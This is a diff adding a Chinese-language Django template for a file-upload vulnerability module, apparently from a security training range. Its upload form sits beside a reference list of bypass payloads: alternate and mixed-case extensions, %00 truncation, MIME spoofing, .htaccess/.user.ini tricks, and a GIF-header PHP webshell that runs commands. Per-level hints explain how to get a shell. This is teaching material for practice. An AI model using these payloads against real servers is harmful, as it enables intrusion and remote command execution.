@@ -1,0 +1,120 @@
+{% extends "base.html" %}
+{% block title %}文件上传 - XinRange{% endblock %}
+
+{% block content %}
+<a href="/" class="back-link">← 返回首页</a>
+
+<div class="card">
+    <div class="card-title">📤 文件上传漏洞</div>
+    <div class="card-desc">
+        漏洞原理：服务器对用户上传的文件类型、内容、扩展名验证不严格，攻击者可上传恶意文件（如 WebShell）并执行。<br>
+        本模块模拟常见上传场景，演示黑名单/白名单过滤的绕过技巧。
+    </div>
+</div>
+
+<!-- 难度选择 -->
+<div class="difficulty-bar">
+    <span>难度：</span>
+    <a href="?level=low"><button class="diff-btn low {% if difficulty == 'low' %}active{% endif %}">🔵 Low</button></a>
+    <a href="?level=medium"><button class="diff-btn medium {% if difficulty == 'medium' %}active{% endif %}">🟡 Medium</button></a>
+    <a href="?level=high"><button class="diff-btn high {% if difficulty == 'high' %}active{% endif %}">🔴 High</button></a>
+</div>
+
+<!-- 上传表单 -->
+<div class="card">
+    <div class="card-title">上传文件</div>
+    <form method="post" enctype="multipart/form-data" action="/vulns/upload/do/?level={{ difficulty }}">
+        {% csrf_token %}
+        <div style="display:grid;grid-template-columns:1fr 1fr;gap:10px;">
+            <div>
+                <label style="font-size:13px;color:var(--muted);display:block;margin-bottom:4px;">昵称</label>
+                <input type="text" name="uploader" placeholder="上传者" required>
+            </div>
+            <div>
+                <label style="font-size:13px;color:var(--muted);display:block;margin-bottom:4px;">选择文件</label>
+                <input type="file" name="file" required>
+            </div>
+        </div>
+        <button type="submit" class="btn btn-primary" style="margin-top:8px;">上传</button>
+    </form>
+
+    <div style="margin-top:20px;">
+        <strong style="font-size:13px;color:var(--muted);">已上传文件：</strong>
+        {% if files %}
+        <table style="margin-top:8px;">
+            <thead><tr><th>文件名</th><th>上传者</th><th>大小</th><th>时间</th></tr></thead>
+            <tbody>
+            {% for f in files %}
+            <tr>
+                <td>{{ f.filename }}</td>
+                <td>{{ f.uploader }}</td>
+                <td>{{ f.size|filesizeformat }}</td>
+                <td style="color:var(--muted);font-size:12px;">{{ f.created_at|date:"Y-m-d H:i" }}</td>
+            </tr>
+            {% endfor %}
+            </tbody>
+        </table>
+        {% else %}
+        <div class="alert alert-warn" style="margin-top:8px;">暂无上传记录。</div>
+        {% endif %}
+    </div>
+</div>
+
+<!-- 参考 Payload -->
+<div class="card">
+    <div class="card-title">文件上传绕过 Payload</div>
+    <div class="card-desc">
+        <pre># 1. 扩展名绕过（黑名单不全）
+shell.php
+shell.php3
+shell.php4
+shell.php5
+shell.phtml
+shell.shtml
+shell.aspx
+shell.asp
+shell.asa
+shell.cer
+
+# 2. 大小写混合绕过
+shell.PhP
+shell.Asp
+
+# 3. 双写扩展名绕过（过滤替换漏洞）
+shell.php.php  → 过滤后变成 shell.php.
+shell.pphphp   → 过滤后变成 shell.php
+
+# 4. 特殊字符（%00 截断）
+shell.php%00.jpg   → 服务器截断为 shell.php
+shell.php%00.png
+
+# 5. MIME 类型绕过（Burp 改 Content-Type）
+Content-Type: image/jpeg
+
+# 6. 文件头伪装（图片马）
+GIF89a
+&lt;?php system($_GET['cmd']); ?&gt;
+
+# 7. 竞争上传（时间窗口内访问）
+短时间内大量上传请求
+
+# 8. .htaccess / .user.ini 解析
+.htaccess: AddType application/x-httpd-php .abc
+.user.ini: auto_prepend_file=shell.png</pre>
+    </div>
+</div>
+
+{% if difficulty == 'low' %}
+<div class="alert alert-danger">
+    ⚠️ Low 难度：服务器不过滤任何扩展名，直接保存。上传 <code>shell.php</code> 即可Getshell。
+</div>
+{% elif difficulty == 'medium' %}
+<div class="alert alert-warn">
+    ⚠️ Medium 难度：黑名单过滤了 <code>.php .jsp .asp .aspx</code>。尝试 <code>.phtml</code>、<code>.php5</code> 或大小写混合绕过。
+</div>
+{% else %}
+<div class="alert alert-success">
+    ✅ High 难度：白名单 + 文件重命名 + MIME检查。上传图片马或尝试 <code>.htaccess</code> 解析漏洞。
+</div>
+{% endif %}
+{% endblock %}
